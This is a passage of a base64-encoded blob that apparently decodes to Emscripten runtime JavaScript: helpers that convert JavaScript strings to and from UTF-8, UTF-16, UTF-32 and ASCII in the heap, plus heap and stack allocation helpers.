odSA+PiAxOCk7DQogICAgICBoZWFwW291dElkeCsrXSA9IDB4ODAgfCAoKHUgPj4gMTIpICYgNjMpOw0KICAgICAgaGVhcFtvdXRJZHgrK10gPSAweDgwIHwgKCh1ID4+IDYpICYgNjMpOw0KICAgICAgaGVhcFtvdXRJZHgrK10gPSAweDgwIHwgKHUgJiA2Myk7DQogICAgfQ0KICB9DQogIC8vIE51bGwtdGVybWluYXRlIHRoZSBwb2ludGVyIHRvIHRoZSBidWZmZXIuDQogIGhlYXBbb3V0SWR4XSA9IDA7DQogIHJldHVybiBvdXRJZHggLSBzdGFydElkeDsNCn0NCg0KLy8gQ29waWVzIHRoZSBnaXZlbiBKYXZhc2NyaXB0IFN0cmluZyBvYmplY3QgJ3N0cicgdG8gdGhlIGVtc2NyaXB0ZW4gSEVBUCBhdCBhZGRyZXNzICdvdXRQdHInLA0KLy8gbnVsbC10ZXJtaW5hdGVkIGFuZCBlbmNvZGVkIGluIFVURjggZm9ybS4gVGhlIGNvcHkgd2lsbCByZXF1aXJlIGF0IG1vc3Qgc3RyLmxlbmd0aCo0KzEgYnl0ZXMgb2Ygc3BhY2UgaW4gdGhlIEhFQVAuDQovLyBVc2UgdGhlIGZ1bmN0aW9uIGxlbmd0aEJ5dGVzVVRGOCB0byBjb21wdXRlIHRoZSBleGFjdCBudW1iZXIgb2YgYnl0ZXMgKGV4Y2x1ZGluZyBudWxsIHRlcm1pbmF0b3IpIHRoYXQgdGhpcyBmdW5jdGlvbiB3aWxsIHdyaXRlLg0KLy8gUmV0dXJucyB0aGUgbnVtYmVyIG9mIGJ5dGVzIHdyaXR0ZW4sIEVYQ0xVRElORyB0aGUgbnVsbCB0ZXJtaW5hdG9yLg0KDQpmdW5jdGlvbiBzdHJpbmdUb1VURjgoc3RyLCBvdXRQdHIsIG1heEJ5dGVzVG9Xcml0ZSkgew0KICBhc3NlcnQodHlwZW9mIG1heEJ5dGVzVG9Xcml0ZSA9PSAnbnVtYmVyJywgJ3N0cmluZ1RvVVRGOChzdHIsIG91dFB0ciwgbWF4Qnl0ZXNUb1dyaXRlKSBpcyBtaXNzaW5nIHRoZSB0aGlyZCBwYXJhbWV0ZXIgdGhhdCBzcGVjaWZpZXMgdGhlIGxlbmd0aCBvZiB0aGUgb3V0cHV0IGJ1ZmZlciEnKTsNCiAgcmV0dXJuIHN0cmluZ1RvVVRGOEFycmF5KHN0ciwgSEVBUFU4LG91dFB0ciwgbWF4Qnl0ZXNUb1dyaXRlKTsNCn0NCg0KLy8gUmV0dXJucyB0aGUgbnVtYmVyIG9mIGJ5dGVzIHRoZSBnaXZlbiBKYXZhc2NyaXB0IHN0cmluZyB0YWtlcyBpZiBlbmNvZGVkIGFzIGEgVVRGOCBieXRlIGFycmF5LCBFWENMVURJTkcgdGhlIG51bGwgdGVybWluYXRvciBieXRlLg0KZnVuY3Rpb24gbGVuZ3RoQnl0ZXNVVEY4KHN0cikgew0KICB2YXIgbGVuID0gMDsNCiAgZm9yICh2YXIgaSA9IDA7IGkgPCBzdHIubGVuZ3RoOyArK2kpIHsNCiAgICAvLyBHb3RjaGE6IGNoYXJDb2RlQXQgcmV0dXJucyBhIDE2LWJpdCB3b3JkIHRoYXQgaXMgYSBVVEYtMTYgZW5jb2RlZCBjb2RlIHVuaXQsIG5vdCBhIFVuaWNvZGUgY29kZSBwb2ludCBvZiB0aGUgY2hhcmFjdGVyISBTbyBkZWNvZGUgVVRGMTYtPlVURjMyLT5VVEY4Lg0KICAgIC8vIFNlZSBodHRwOi8vdW5pY29kZS5vcmcvZmFxL3V0Zl9ib20uaHRtbCN1dGYxNi0zDQogICAgdmFyIHUgPSBzdHIuY2hhckNvZGVBdChpKTsgLy8gcG9zc2libHkgYSBsZWFkIHN1cnJvZ2F0ZQ0KICAgIGlmICh1ID49IDB4RDgwMCAmJiB1IDw9IDB4REZGRikgdSA9IDB4MTAwMDAgKyAoKHUgJiAweDNGRikgPDwgMTApIHwgKHN0ci5jaGFyQ29kZUF0KCsraSkgJiAweDNGRik7DQogICAgaWYgKHUgPD0gMHg3RikgKytsZW47DQogICAgZWxzZSBpZiAodSA8PSAweDdGRikgbGVuICs9IDI7DQogICAgZWxzZSBpZiAodSA8PSAweEZGRkYpIGxlbiArPSAzOw0KICAgIGVsc2UgbGVuICs9IDQ7DQogIH0NCiAgcmV0dXJuIGxlbjsNCn0NCg0KDQoNCg0KDQovLyBydW50aW1lX3N0cmluZ3NfZXh0cmEuanM6IFN0cmluZ3MgcmVsYXRlZCBydW50aW1lIGZ1bmN0aW9ucyB0aGF0IGFyZSBhdmFpbGFibGUgb25seSBpbiByZWd1bGFyIHJ1bnRpbWUuDQoNCi8vIEdpdmVuIGEgcG9pbnRlciAncHRyJyB0byBhIG51bGwtdGVybWluYXRlZCBBU0NJSS1lbmNvZGVkIHN0cmluZyBpbiB0aGUgZW1zY3JpcHRlbiBIRUFQLCByZXR1cm5zDQovLyBhIGNvcHkgb2YgdGhhdCBzdHJpbmcgYXMgYSBKYXZhc2NyaXB0IFN0cmluZyBvYmplY3QuDQoNCmZ1bmN0aW9uIEFzY2lpVG9TdHJpbmcocHRyKSB7DQogIHZhciBzdHIgPSAnJzsNCiAgd2hpbGUgKDEpIHsNCiAgICB2YXIgY2ggPSBIRUFQVThbKChwdHIrKyk+PjApXTsNCiAgICBpZiAoIWNoKSByZXR1cm4gc3RyOw0KICAgIHN0ciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKGNoKTsNCiAgfQ0KfQ0KDQovLyBDb3BpZXMgdGhlIGdpdmVuIEphdmFzY3JpcHQgU3RyaW5nIG9iamVjdCAnc3RyJyB0byB0aGUgZW1zY3JpcHRlbiBIRUFQIGF0IGFkZHJlc3MgJ291dFB0cicsDQovLyBudWxsLXRlcm1pbmF0ZWQgYW5kIGVuY29kZWQgaW4gQVNDSUkgZm9ybS4gVGhlIGNvcHkgd2lsbCByZXF1aXJlIGF0IG1vc3Qgc3RyLmxlbmd0aCsxIGJ5dGVzIG9mIHNwYWNlIGluIHRoZSBIRUFQLg0KDQpmdW5jdGlvbiBzdHJpbmdUb0FzY2lpKHN0ciwgb3V0UHRyKSB7DQogIHJldHVybiB3cml0ZUFzY2lpVG9NZW1vcnkoc3RyLCBvdXRQdHIsIGZhbHNlKTsNCn0NCg0KLy8gR2l2ZW4gYSBwb2ludGVyICdwdHInIHRvIGEgbnVsbC10ZXJtaW5hdGVkIFVURjE2TEUtZW5jb2RlZCBzdHJpbmcgaW4gdGhlIGVtc2NyaXB0ZW4gSEVBUCwgcmV0dXJucw0KLy8gYSBjb3B5IG9mIHRoYXQgc3RyaW5nIGFzIGEgSmF2YXNjcmlwdCBTdHJpbmcgb2JqZWN0Lg0KDQp2YXIgVVRGMTZEZWNvZGVyID0gdHlwZW9mIFRleHREZWNvZGVyICE9PSAndW5kZWZpbmVkJyA/IG5ldyBUZXh0RGVjb2RlcigndXRmLTE2bGUnKSA6IHVuZGVmaW5lZDsNCg0KZnVuY3Rpb24gVVRGMTZUb1N0cmluZyhwdHIsIG1heEJ5dGVzVG9SZWFkKSB7DQogIGFzc2VydChwdHIgJSAyID09IDAsICdQb2ludGVyIHBhc3NlZCB0byBVVEYxNlRvU3RyaW5nIG11c3QgYmUgYWxpZ25lZCB0byB0d28gYnl0ZXMhJyk7DQogIHZhciBlbmRQdHIgPSBwdHI7DQogIC8vIFRleHREZWNvZGVyIG5lZWRzIHRvIGtub3cgdGhlIGJ5dGUgbGVuZ3RoIGluIGFkdmFuY2UsIGl0IGRvZXNuJ3Qgc3RvcCBvbiBudWxsIHRlcm1pbmF0b3IgYnkgaXRzZWxmLg0KICAvLyBBbHNvLCB1c2UgdGhlIGxlbmd0aCBpbmZvIHRvIGF2b2lkIHJ1bm5pbmcgdGlueSBzdHJpbmdzIHRocm91Z2ggVGV4dERlY29kZXIsIHNpbmNlIC5zdWJhcnJheSgpIGFsbG9jYXRlcyBnYXJiYWdlLg0KICB2YXIgaWR4ID0gZW5kUHRyID4+IDE7DQogIHZhciBtYXhJZHggPSBpZHggKyBtYXhCeXRlc1RvUmVhZCAvIDI7DQogIC8vIElmIG1heEJ5dGVzVG9SZWFkIGlzIG5vdCBwYXNzZWQgZXhwbGljaXRseSwgaXQgd2lsbCBiZSB1bmRlZmluZWQsIGFuZCB0aGlzDQogIC8vIHdpbGwgYWx3YXlzIGV2YWx1YXRlIHRvIHRydWUuIFRoaXMgc2F2ZXMgb24gY29kZSBzaXplLg0KICB3aGlsZSAoIShpZHggPj0gbWF4SWR4KSAmJiBIRUFQVTE2W2lkeF0pICsraWR4Ow0KICBlbmRQdHIgPSBpZHggPDwgMTsNCg0KICBpZiAoZW5kUHRyIC0gcHRyID4gMzIgJiYgVVRGMTZEZWNvZGVyKSB7DQogICAgcmV0dXJuIFVURjE2RGVjb2Rlci5kZWNvZGUoSEVBUFU4LnN1YmFycmF5KHB0ciwgZW5kUHRyKSk7DQogIH0gZWxzZSB7DQogICAgdmFyIGkgPSAwOw0KDQogICAgdmFyIHN0ciA9ICcnOw0KICAgIHdoaWxlICgxKSB7DQogICAgICB2YXIgY29kZVVuaXQgPSBIRUFQMTZbKCgocHRyKSsoaSoyKSk+PjEpXTsNCiAgICAgIGlmIChjb2RlVW5pdCA9PSAwIHx8IGkgPT0gbWF4Qnl0ZXNUb1JlYWQgLyAyKSByZXR1cm4gc3RyOw0KICAgICAgKytpOw0KICAgICAgLy8gZnJvbUNoYXJDb2RlIGNvbnN0cnVjdHMgYSBjaGFyYWN0ZXIgZnJvbSBhIFVURi0xNiBjb2RlIHVuaXQsIHNvIHdlIGNhbiBwYXNzIHRoZSBVVEYxNiBzdHJpbmcgcmlnaHQgdGhyb3VnaC4NCiAgICAgIHN0ciArPSBTdHJpbmcuZnJvbUNoYXJDb2RlKGNvZGVVbml0KTsNCiAgICB9DQogIH0NCn0NCg0KLy8gQ29waWVzIHRoZSBnaXZlbiBKYXZhc2NyaXB0IFN0cmluZyBvYmplY3QgJ3N0cicgdG8gdGhlIGVtc2NyaXB0ZW4gSEVBUCBhdCBhZGRyZXNzICdvdXRQdHInLA0KLy8gbnVsbC10ZXJtaW5hdGVkIGFuZCBlbmNvZGVkIGluIFVURjE2IGZvcm0uIFRoZSBjb3B5IHdpbGwgcmVxdWlyZSBhdCBtb3N0IHN0ci5sZW5ndGgqNCsyIGJ5dGVzIG9mIHNwYWNlIGluIHRoZSBIRUFQLg0KLy8gVXNlIHRoZSBmdW5jdGlvbiBsZW5ndGhCeXRlc1VURjE2KCkgdG8gY29tcHV0ZSB0aGUgZXhhY3QgbnVtYmVyIG9mIGJ5dGVzIChleGNsdWRpbmcgbnVsbCB0ZXJtaW5hdG9yKSB0aGF0IHRoaXMgZnVuY3Rpb24gd2lsbCB3cml0ZS4NCi8vIFBhcmFtZXRlcnM6DQovLyAgIHN0cjogdGhlIEphdmFzY3JpcHQgc3RyaW5nIHRvIGNvcHkuDQovLyAgIG91dFB0cjogQnl0ZSBhZGRyZXNzIGluIEVtc2NyaXB0ZW4gSEVBUCB3aGVyZSB0byB3cml0ZSB0aGUgc3RyaW5nIHRvLg0KLy8gICBtYXhCeXRlc1RvV3JpdGU6IFRoZSBtYXhpbXVtIG51bWJlciBvZiBieXRlcyB0aGlzIGZ1bmN0aW9uIGNhbiB3cml0ZSB0byB0aGUgYXJyYXkuIFRoaXMgY291bnQgc2hvdWxkIGluY2x1ZGUgdGhlIG51bGwNCi8vICAgICAgICAgICAgICAgICAgICB0ZXJtaW5hdG9yLCBpLmUuIGlmIG1heEJ5dGVzVG9Xcml0ZT0yLCBvbmx5IHRoZSBudWxsIHRlcm1pbmF0b3Igd2lsbCBiZSB3cml0dGVuIGFuZCBub3RoaW5nIGVsc2UuDQovLyAgICAgICAgICAgICAgICAgICAgbWF4Qnl0ZXNUb1dyaXRlPDIgZG9lcyBub3Qgd3JpdGUgYW55IGJ5dGVzIHRvIHRoZSBvdXRwdXQsIG5vdCBldmVuIHRoZSBudWxsIHRlcm1pbmF0b3IuDQovLyBSZXR1cm5zIHRoZSBudW1iZXIgb2YgYnl0ZXMgd3JpdHRlbiwgRVhDTFVESU5HIHRoZSBudWxsIHRlcm1pbmF0b3IuDQoNCmZ1bmN0aW9uIHN0cmluZ1RvVVRGMTYoc3RyLCBvdXRQdHIsIG1heEJ5dGVzVG9Xcml0ZSkgew0KICBhc3NlcnQob3V0UHRyICUgMiA9PSAwLCAnUG9pbnRlciBwYXNzZWQgdG8gc3RyaW5nVG9VVEYxNiBtdXN0IGJlIGFsaWduZWQgdG8gdHdvIGJ5dGVzIScpOw0KICBhc3NlcnQodHlwZW9mIG1heEJ5dGVzVG9Xcml0ZSA9PSAnbnVtYmVyJywgJ3N0cmluZ1RvVVRGMTYoc3RyLCBvdXRQdHIsIG1heEJ5dGVzVG9Xcml0ZSkgaXMgbWlzc2luZyB0aGUgdGhpcmQgcGFyYW1ldGVyIHRoYXQgc3BlY2lmaWVzIHRoZSBsZW5ndGggb2YgdGhlIG91dHB1dCBidWZmZXIhJyk7DQogIC8vIEJhY2t3YXJkcyBjb21wYXRpYmlsaXR5OiBpZiBtYXggYnl0ZXMgaXMgbm90IHNwZWNpZmllZCwgYXNzdW1lIHVuc2FmZSB1bmJvdW5kZWQgd3JpdGUgaXMgYWxsb3dlZC4NCiAgaWYgKG1heEJ5dGVzVG9Xcml0ZSA9PT0gdW5kZWZpbmVkKSB7DQogICAgbWF4Qnl0ZXNUb1dyaXRlID0gMHg3RkZGRkZGRjsNCiAgfQ0KICBpZiAobWF4Qnl0ZXNUb1dyaXRlIDwgMikgcmV0dXJuIDA7DQogIG1heEJ5dGVzVG9Xcml0ZSAtPSAyOyAvLyBOdWxsIHRlcm1pbmF0b3IuDQogIHZhciBzdGFydFB0ciA9IG91dFB0cjsNCiAgdmFyIG51bUNoYXJzVG9Xcml0ZSA9IChtYXhCeXRlc1RvV3JpdGUgPCBzdHIubGVuZ3RoKjIpID8gKG1heEJ5dGVzVG9Xcml0ZSAvIDIpIDogc3RyLmxlbmd0aDsNCiAgZm9yICh2YXIgaSA9IDA7IGkgPCBudW1DaGFyc1RvV3JpdGU7ICsraSkgew0KICAgIC8vIGNoYXJDb2RlQXQgcmV0dXJucyBhIFVURi0xNiBlbmNvZGVkIGNvZGUgdW5pdCwgc28gaXQgY2FuIGJlIGRpcmVjdGx5IHdyaXR0ZW4gdG8gdGhlIEhFQVAuDQogICAgdmFyIGNvZGVVbml0ID0gc3RyLmNoYXJDb2RlQXQoaSk7IC8vIHBvc3NpYmx5IGEgbGVhZCBzdXJyb2dhdGUNCiAgICBIRUFQMTZbKChvdXRQdHIpPj4xKV09Y29kZVVuaXQ7DQogICAgb3V0UHRyICs9IDI7DQogIH0NCiAgLy8gTnVsbC10ZXJtaW5hdGUgdGhlIHBvaW50ZXIgdG8gdGhlIEhFQVAuDQogIEhFQVAxNlsoKG91dFB0cik+PjEpXT0wOw0KICByZXR1cm4gb3V0UHRyIC0gc3RhcnRQdHI7DQp9DQoNCi8vIFJldHVybnMgdGhlIG51bWJlciBvZiBieXRlcyB0aGUgZ2l2ZW4gSmF2YXNjcmlwdCBzdHJpbmcgdGFrZXMgaWYgZW5jb2RlZCBhcyBhIFVURjE2IGJ5dGUgYXJyYXksIEVYQ0xVRElORyB0aGUgbnVsbCB0ZXJtaW5hdG9yIGJ5dGUuDQoNCmZ1bmN0aW9uIGxlbmd0aEJ5dGVzVVRGMTYoc3RyKSB7DQogIHJldHVybiBzdHIubGVuZ3RoKjI7DQp9DQoNCmZ1bmN0aW9uIFVURjMyVG9TdHJpbmcocHRyLCBtYXhCeXRlc1RvUmVhZCkgew0KICBhc3NlcnQocHRyICUgNCA9PSAwLCAnUG9pbnRlciBwYXNzZWQgdG8gVVRGMzJUb1N0cmluZyBtdXN0IGJlIGFsaWduZWQgdG8gZm91ciBieXRlcyEnKTsNCiAgdmFyIGkgPSAwOw0KDQogIHZhciBzdHIgPSAnJzsNCiAgLy8gSWYgbWF4Qnl0ZXNUb1JlYWQgaXMgbm90IHBhc3NlZCBleHBsaWNpdGx5LCBpdCB3aWxsIGJlIHVuZGVmaW5lZCwgYW5kIHRoaXMNCiAgLy8gd2lsbCBhbHdheXMgZXZhbHVhdGUgdG8gdHJ1ZS4gVGhpcyBzYXZlcyBvbiBjb2RlIHNpemUuDQogIHdoaWxlICghKGkgPj0gbWF4Qnl0ZXNUb1JlYWQgLyA0KSkgew0KICAgIHZhciB1dGYzMiA9IEhFQVAzMlsoKChwdHIpKyhpKjQpKT4+MildOw0KICAgIGlmICh1dGYzMiA9PSAwKSBicmVhazsNCiAgICArK2k7DQogICAgLy8gR290Y2hhOiBmcm9tQ2hhckNvZGUgY29uc3RydWN0cyBhIGNoYXJhY3RlciBmcm9tIGEgVVRGLTE2IGVuY29kZWQgY29kZSAocGFpciksIG5vdCBmcm9tIGEgVW5pY29kZSBjb2RlIHBvaW50ISBTbyBlbmNvZGUgdGhlIGNvZGUgcG9pbnQgdG8gVVRGLTE2IGZvciBjb25zdHJ1Y3RpbmcuDQogICAgLy8gU2VlIGh0dHA6Ly91bmljb2RlLm9yZy9mYXEvdXRmX2JvbS5odG1sI3V0ZjE2LTMNCiAgICBpZiAodXRmMzIgPj0gMHgxMDAwMCkgew0KICAgICAgdmFyIGNoID0gdXRmMzIgLSAweDEwMDAwOw0KICAgICAgc3RyICs9IFN0cmluZy5mcm9tQ2hhckNvZGUoMHhEODAwIHwgKGNoID4+IDEwKSwgMHhEQzAwIHwgKGNoICYgMHgzRkYpKTsNCiAgICB9IGVsc2Ugew0KICAgICAgc3RyICs9IFN0cmluZy5mcm9tQ2hhckNvZGUodXRmMzIpOw0KICAgIH0NCiAgfQ0KICByZXR1cm4gc3RyOw0KfQ0KDQovLyBDb3BpZXMgdGhlIGdpdmVuIEphdmFzY3JpcHQgU3RyaW5nIG9iamVjdCAnc3RyJyB0byB0aGUgZW1zY3JpcHRlbiBIRUFQIGF0IGFkZHJlc3MgJ291dFB0cicsDQovLyBudWxsLXRlcm1pbmF0ZWQgYW5kIGVuY29kZWQgaW4gVVRGMzIgZm9ybS4gVGhlIGNvcHkgd2lsbCByZXF1aXJlIGF0IG1vc3Qgc3RyLmxlbmd0aCo0KzQgYnl0ZXMgb2Ygc3BhY2UgaW4gdGhlIEhFQVAuDQovLyBVc2UgdGhlIGZ1bmN0aW9uIGxlbmd0aEJ5dGVzVVRGMzIoKSB0byBjb21wdXRlIHRoZSBleGFjdCBudW1iZXIgb2YgYnl0ZXMgKGV4Y2x1ZGluZyBudWxsIHRlcm1pbmF0b3IpIHRoYXQgdGhpcyBmdW5jdGlvbiB3aWxsIHdyaXRlLg0KLy8gUGFyYW1ldGVyczoNCi8vICAgc3RyOiB0aGUgSmF2YXNjcmlwdCBzdHJpbmcgdG8gY29weS4NCi8vICAgb3V0UHRyOiBCeXRlIGFkZHJlc3MgaW4gRW1zY3JpcHRlbiBIRUFQIHdoZXJlIHRvIHdyaXRlIHRoZSBzdHJpbmcgdG8uDQovLyAgIG1heEJ5dGVzVG9Xcml0ZTogVGhlIG1heGltdW0gbnVtYmVyIG9mIGJ5dGVzIHRoaXMgZnVuY3Rpb24gY2FuIHdyaXRlIHRvIHRoZSBhcnJheS4gVGhpcyBjb3VudCBzaG91bGQgaW5jbHVkZSB0aGUgbnVsbA0KLy8gICAgICAgICAgICAgICAgICAgIHRlcm1pbmF0b3IsIGkuZS4gaWYgbWF4Qnl0ZXNUb1dyaXRlPTQsIG9ubHkgdGhlIG51bGwgdGVybWluYXRvciB3aWxsIGJlIHdyaXR0ZW4gYW5kIG5vdGhpbmcgZWxzZS4NCi8vICAgICAgICAgICAgICAgICAgICBtYXhCeXRlc1RvV3JpdGU8NCBkb2VzIG5vdCB3cml0ZSBhbnkgYnl0ZXMgdG8gdGhlIG91dHB1dCwgbm90IGV2ZW4gdGhlIG51bGwgdGVybWluYXRvci4NCi8vIFJldHVybnMgdGhlIG51bWJlciBvZiBieXRlcyB3cml0dGVuLCBFWENMVURJTkcgdGhlIG51bGwgdGVybWluYXRvci4NCg0KZnVuY3Rpb24gc3RyaW5nVG9VVEYzMihzdHIsIG91dFB0ciwgbWF4Qnl0ZXNUb1dyaXRlKSB7DQogIGFzc2VydChvdXRQdHIgJSA0ID09IDAsICdQb2ludGVyIHBhc3NlZCB0byBzdHJpbmdUb1VURjMyIG11c3QgYmUgYWxpZ25lZCB0byBmb3VyIGJ5dGVzIScpOw0KICBhc3NlcnQodHlwZW9mIG1heEJ5dGVzVG9Xcml0ZSA9PSAnbnVtYmVyJywgJ3N0cmluZ1RvVVRGMzIoc3RyLCBvdXRQdHIsIG1heEJ5dGVzVG9Xcml0ZSkgaXMgbWlzc2luZyB0aGUgdGhpcmQgcGFyYW1ldGVyIHRoYXQgc3BlY2lmaWVzIHRoZSBsZW5ndGggb2YgdGhlIG91dHB1dCBidWZmZXIhJyk7DQogIC8vIEJhY2t3YXJkcyBjb21wYXRpYmlsaXR5OiBpZiBtYXggYnl0ZXMgaXMgbm90IHNwZWNpZmllZCwgYXNzdW1lIHVuc2FmZSB1bmJvdW5kZWQgd3JpdGUgaXMgYWxsb3dlZC4NCiAgaWYgKG1heEJ5dGVzVG9Xcml0ZSA9PT0gdW5kZWZpbmVkKSB7DQogICAgbWF4Qnl0ZXNUb1dyaXRlID0gMHg3RkZGRkZGRjsNCiAgfQ0KICBpZiAobWF4Qnl0ZXNUb1dyaXRlIDwgNCkgcmV0dXJuIDA7DQogIHZhciBzdGFydFB0ciA9IG91dFB0cjsNCiAgdmFyIGVuZFB0ciA9IHN0YXJ0UHRyICsgbWF4Qnl0ZXNUb1dyaXRlIC0gNDsNCiAgZm9yICh2YXIgaSA9IDA7IGkgPCBzdHIubGVuZ3RoOyArK2kpIHsNCiAgICAvLyBHb3RjaGE6IGNoYXJDb2RlQXQgcmV0dXJucyBhIDE2LWJpdCB3b3JkIHRoYXQgaXMgYSBVVEYtMTYgZW5jb2RlZCBjb2RlIHVuaXQsIG5vdCBhIFVuaWNvZGUgY29kZSBwb2ludCBvZiB0aGUgY2hhcmFjdGVyISBXZSBtdXN0IGRlY29kZSB0aGUgc3RyaW5nIHRvIFVURi0zMiB0byB0aGUgaGVhcC4NCiAgICAvLyBTZWUgaHR0cDovL3VuaWNvZGUub3JnL2ZhcS91dGZfYm9tLmh0bWwjdXRmMTYtMw0KICAgIHZhciBjb2RlVW5pdCA9IHN0ci5jaGFyQ29kZUF0KGkpOyAvLyBwb3NzaWJseSBhIGxlYWQgc3Vycm9nYXRlDQogICAgaWYgKGNvZGVVbml0ID49IDB4RDgwMCAmJiBjb2RlVW5pdCA8PSAweERGRkYpIHsNCiAgICAgIHZhciB0cmFpbFN1cnJvZ2F0ZSA9IHN0ci5jaGFyQ29kZUF0KCsraSk7DQogICAgICBjb2RlVW5pdCA9IDB4MTAwMDAgKyAoKGNvZGVVbml0ICYgMHgzRkYpIDw8IDEwKSB8ICh0cmFpbFN1cnJvZ2F0ZSAmIDB4M0ZGKTsNCiAgICB9DQogICAgSEVBUDMyWygob3V0UHRyKT4+MildPWNvZGVVbml0Ow0KICAgIG91dFB0ciArPSA0Ow0KICAgIGlmIChvdXRQdHIgKyA0ID4gZW5kUHRyKSBicmVhazsNCiAgfQ0KICAvLyBOdWxsLXRlcm1pbmF0ZSB0aGUgcG9pbnRlciB0byB0aGUgSEVBUC4NCiAgSEVBUDMyWygob3V0UHRyKT4+MildPTA7DQogIHJldHVybiBvdXRQdHIgLSBzdGFydFB0cjsNCn0NCg0KLy8gUmV0dXJucyB0aGUgbnVtYmVyIG9mIGJ5dGVzIHRoZSBnaXZlbiBKYXZhc2NyaXB0IHN0cmluZyB0YWtlcyBpZiBlbmNvZGVkIGFzIGEgVVRGMTYgYnl0ZSBhcnJheSwgRVhDTFVESU5HIHRoZSBudWxsIHRlcm1pbmF0b3IgYnl0ZS4NCg0KZnVuY3Rpb24gbGVuZ3RoQnl0ZXNVVEYzMihzdHIpIHsNCiAgdmFyIGxlbiA9IDA7DQogIGZvciAodmFyIGkgPSAwOyBpIDwgc3RyLmxlbmd0aDsgKytpKSB7DQogICAgLy8gR290Y2hhOiBjaGFyQ29kZUF0IHJldHVybnMgYSAxNi1iaXQgd29yZCB0aGF0IGlzIGEgVVRGLTE2IGVuY29kZWQgY29kZSB1bml0LCBub3QgYSBVbmljb2RlIGNvZGUgcG9pbnQgb2YgdGhlIGNoYXJhY3RlciEgV2UgbXVzdCBkZWNvZGUgdGhlIHN0cmluZyB0byBVVEYtMzIgdG8gdGhlIGhlYXAuDQogICAgLy8gU2VlIGh0dHA6Ly91bmljb2RlLm9yZy9mYXEvdXRmX2JvbS5odG1sI3V0ZjE2LTMNCiAgICB2YXIgY29kZVVuaXQgPSBzdHIuY2hhckNvZGVBdChpKTsNCiAgICBpZiAoY29kZVVuaXQgPj0gMHhEODAwICYmIGNvZGVVbml0IDw9IDB4REZGRikgKytpOyAvLyBwb3NzaWJseSBhIGxlYWQgc3Vycm9nYXRlLCBzbyBza2lwIG92ZXIgdGhlIHRhaWwgc3Vycm9nYXRlLg0KICAgIGxlbiArPSA0Ow0KICB9DQoNCiAgcmV0dXJuIGxlbjsNCn0NCg0KLy8gQWxsb2NhdGUgaGVhcCBzcGFjZSBmb3IgYSBKUyBzdHJpbmcsIGFuZCB3cml0ZSBpdCB0aGVyZS4NCi8vIEl0IGlzIHRoZSByZXNwb25zaWJpbGl0eSBvZiB0aGUgY2FsbGVyIHRvIGZyZWUoKSB0aGF0IG1lbW9yeS4NCmZ1bmN0aW9uIGFsbG9jYXRlVVRGOChzdHIpIHsNCiAgdmFyIHNpemUgPSBsZW5ndGhCeXRlc1VURjgoc3RyKSArIDE7DQogIHZhciByZXQgPSBfbWFsbG9jKHNpemUpOw0KICBpZiAocmV0KSBzdHJpbmdUb1VURjhBcnJheShzdHIsIEhFQVA4LCByZXQsIHNpemUpOw0KICByZXR1cm4gcmV0Ow0KfQ0KDQovLyBBbGxvY2F0ZSBzdGFjayBzcGFjZSBmb3IgYSBKUyBzdHJpbmcsIGFuZCB3cml0ZSBpdCB0aGVyZS4NCmZ1bmN0aW9uIGFsbG9jYXRlVVRGOE9uU3RhY2soc3RyKSB7DQogIHZhciBzaXplID0gbGVuZ3RoQnl0ZXNVVEY4KHN0cikgKyAxOw0KICB2YXIgcmV0ID0gc3RhY2tBbGxvYyhzaXplKTsNCiAgc3RyaW5nVG9VVEY4QXJyYXkoc3RyLCBIRUFQOCwgcmV0LCBzaXplKTsNCiAgcmV0dXJuIHJldDsNCn0NCg0KLy8gRGVwcmVjYXRlZDogVGhpcyBmdW5jdGlvbiBzaG91bGQgbm90IGJlIGNhbGxlZCBiZWNhdXNlIGl0IGlzIHVuc2FmZSBhbmQgZG9lcyBub3QgcHJvdmlkZQ0KLy8gYSBtYXhpbXVtIGxlbmd0aCBsaW1pdCBvZiBob3cgbWFueSBieXRlcyBpdCBpcyBhbGxvd2VkIHRvIHdyaXRlLiBQcmVmZXIgY2FsbGluZyB0aGUNCi8vIGZ1bmN0aW9uIHN0cmluZ1RvVVRGOEFycmF5KCkgaW5zdGVhZCwgd2hpY2ggdGFrZXMgaW4gYSBtYXhpbXVtIGxlbmd0aCB0aGF0IGNhbiBiZSB1c2VkDQovLyB0byBiZSBzZWN1cmUgZnJvbSBvdXQgb2YgYm91bmRzIHdyaXRlcy4NCi8qKiBAZGVwcmVjYXRlZA0KICAgIEBwYXJhbSB7Ym9vbGVhbj19IGRvbnRBZGROdWxsICovDQpmdW5jdGlvbiB3cml0ZVN0cmluZ1RvTWVtb3J5KHN0cmluZywgYnVmZmVyLCBkb250QWRkTnVsbCkgew0KICB3YXJuT25jZSgnd3JpdGVTdHJpbmdUb01lbW9yeSBpcyBkZXByZWNhdGVkIGFuZCBzaG91bGQgbm90IGJlIGNhbGxlZCEgVXNlIHN0cmluZ1RvVVRGOCgpIGluc3RlYWQhJyk7DQoNCiAgdmFyIC8qKiBAdHlwZSB7bnVtYmVyfSAqLyBsYXN0Q2hhciwgLyoqIEB0eXBlIHtudW1iZXJ9ICovIGVuZDsNCiAgaWYgKGRvbnRBZGROdWxsKSB7DQogICAgLy8gc3RyaW5nVG9VVEY4QXJyYXkgYWx3YXlzIGFwcGVuZHMgbnVsbC4gSWYgd2UgZG9uJ3Qgd2FudCB0byBkbyB0aGF0LCByZW1lbWJlciB0aGUNCiAgICAvLyBjaGFyYWN0ZXIgdGhhdCBleGlzdGVkIGF0IHRoZSBsb2NhdGlvbiB3aGVyZSB0aGUgbnVsbCB3aWxsIGJlIHBsYWNlZCwgYW5kIHJlc3RvcmUNCiAgICAvLyB0aGF0IGFmdGVyIHRoZSB3cml0ZSAoYmVsb3cpLg0KICAgIGVuZCA9IGJ1ZmZlciArIGxlbmd0aEJ5dGVzVVRGOChzdHJpbmcpOw0KICAgIGxhc3RDaGFyID0gSEVBUDhbZW5kXTsNCiAgfQ0KICBzdHJpbmdUb1VURjgoc3RyaW5nLCBidWZmZXIsIEluZmluaXR5KTsNCiAgaWYgKGRvbnRBZGROdWxsKSBIRUFQOFtlbmRdID0gbGFzdENoYXI7IC8vIFJlc3RvcmUgdGhlIHZhbHVlIHVuZGVyIHRoZSBudWxsIGNoYXJhY3Rlci4NCn0NCg0KZnVuY3Rpb24gd3JpdGVBcnJheVRvTWVtb3J5KGFycmF5LCBidWZmZXIpIHsNCiAgYXNzZXJ0KGFycmF5Lmxlbmd0aCA+PSAwLCAnd3JpdGVBcnJheVRvTWVtb3J5IGFycmF5IG11c3QgaGF2ZSBhIGxlbmd0aCAoc2hvdWxkIGJlIGFuIGFycmF5IG9yIHR5cGVk